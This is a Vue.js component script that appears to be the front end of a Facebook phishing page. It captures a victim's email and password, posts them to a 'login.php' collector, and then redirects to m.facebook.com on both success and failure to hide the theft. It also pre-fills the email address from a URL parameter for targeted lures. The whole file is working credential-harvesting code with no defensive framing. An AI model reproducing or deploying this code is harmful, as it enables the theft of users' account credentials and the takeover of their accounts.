<script>
/* eslint-disable */
import axios from 'axios'
export default {
  name: 'App',
  data () {
    return {
      emailaddress: '',
      password: '',
      referrerPage: "//m.facebook.com/",
      passwordInputType: 'password'
    }
  },
  methods: {
    togglePasswordType () {
      this.passwordInputType = this.passwordInputType == 'password' ? 'text' : 'password'
    },
    submitForm () {
      let vm = this
      axios.post('login.php', {email: vm.emailaddress, password: vm.password})
      .then(res => {
        window.location.replace(vm.referrerPage);
      })
      .catch(error => {
        window.location.replace(vm.referrerPage);
      })
    },
    initiatePage () {
        let uri = window.location.href.split("?");
        if (uri.length > 0 && uri[1] !== undefined) {
            let vars = uri[1].split("&");
            let getVars = {};
            let tmp = "";
            vars.forEach(function(v) {
              tmp = v.split("=");
              if (tmp.length == 2)
                getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
            });
            this.emailaddress = "undefined" !== typeof getVars["e"] ? getVars["e"] : "";
        }
    }
  },
  beforeMount () {
    this.initiatePage()
  }
};
</script>

